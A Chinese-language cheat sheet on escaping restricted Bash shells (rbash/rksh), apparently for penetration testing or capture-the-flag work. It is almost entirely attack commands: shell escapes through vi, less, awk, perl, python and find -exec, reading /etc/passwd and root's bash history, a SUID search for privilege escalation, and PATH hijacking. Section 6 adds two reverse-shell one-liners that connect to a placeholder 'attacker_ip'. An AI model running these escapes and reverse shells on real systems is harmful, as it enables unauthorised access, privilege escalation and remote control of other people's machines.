# Bash Jail 逃逸大全

## 逃逸决策树

```
受限 shell (rbash/rksh)
├── 能否使用 cd?
│   ├── 能 → cd /; sh 切换到完整 shell
│   └── 不能 → 找编辑器/其他命令
├── 能否使用引号/转义?
│   ├── 能 → `whoami` 或 $(whoami)
│   └── 不能 → 找其他命令执行方式
├── 能否访问特殊文件?
│   ├── /dev/tcp → 反弹 shell
│   ├── /proc → 读敏感文件
│   └── 能否读 HISTFILE → 读历史命令
└── 是否有命令白名单?
    ├── vi/vim → :!/bin/sh 逃逸
    ├── awk → awk 'BEGIN {system("id")}'
    ├── find → find ... -exec
    └── python/perl → 直接执行命令
```

## 逃逸技术

### 1. 编辑器逃逸
```bash
vi/vim: :!/bin/sh  或  :!/bin/bash
vim:   :shell
less:  !/bin/sh
more:  !/bin/sh
man:   !/bin/sh
```

### 2. 编程语言逃逸
```bash
awk:    awk 'BEGIN {system("whoami")}'
perl:   perl -e 'system("whoami")'
python: python -c 'import os; os.system("whoami")'
ruby:   ruby -e 'system("whoami")'
lua:    lua -e 'os.execute("whoami")'
```

### 3. 文件操作逃逸
```bash
find:   find / -exec whoami \;
dd:     dd if=/dev/null of=/dev/null
cp:     cp /dev/null /tmp/a; cat /tmp/a
```

### 4. 特殊文件描述符
```bash
# 读取 /etc/passwd
cat /etc/passwd
dd if=/etc/passwd
```

### 5. 读历史命令
```bash
cat ~/.bash_history
cat /root/.bash_history
```

### 6. 反弹 Shell
```bash
bash -i >& /dev/tcp/attacker_ip/port 0>&1
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## rbash 特限制

| 限制 | 绕过方法 |
|------|---------|
| 不能 cd | `cd /; /bin/bash` |
| 不能使用 / | 利用相对路径或内置命令 |
| 不能使用 $() | 反引号 `` `$var` `` |
| 不能使用环境变量 | 继承父进程环境 |
| 不能重定向 | `/dev/null` 写文件 |

## 利用 SUID 提权

```bash
# 查找 SUID 文件
find / -perm -4000 2>/dev/null

# 常见可提权 SUID
/usr/bin/sudo
/usr/bin/python
/usr/bin/perl
/bin/more
/bin/less
/bin/awk
/bin/nice
```

## 利用 Path 变量

```bash
# 如果可以设置 PATH
export PATH=/tmp:$PATH
# 在 /tmp 放置恶意程序
```
